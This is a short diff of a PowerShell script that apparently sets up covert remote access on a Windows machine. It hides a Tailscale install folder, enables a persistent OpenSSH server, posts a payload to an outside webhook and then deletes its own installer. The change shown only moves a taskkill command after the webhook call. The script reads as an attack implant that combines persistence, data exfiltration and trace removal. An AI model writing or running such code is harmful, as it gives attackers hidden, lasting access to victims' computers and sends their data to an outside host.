@@ -86,7 +86,6 @@ Start-Sleep 1
 
 ## Finish Tailscale installation
 Get-Item "C:\tailscale" -Force | ForEach-Object {$_.Attributes = $_.Attributes -bor "Hidden"}
-taskkill /im "tailscale-ipn.exe" /F
 
 ## Enable persistent SSH
 Add-WindowsCapability -Online -Name OpenSSH.Server~~~~0.0.1.0
@@ -116,6 +115,8 @@ $payload = @{
 }
 
 Invoke-RestMethod -Uri $Webhook -Method Post -Body $payload;
+
+taskkill /im "tailscale-ipn.exe" /F
 
 ## Self Delete
 Remove-Item "C:/file.msi"
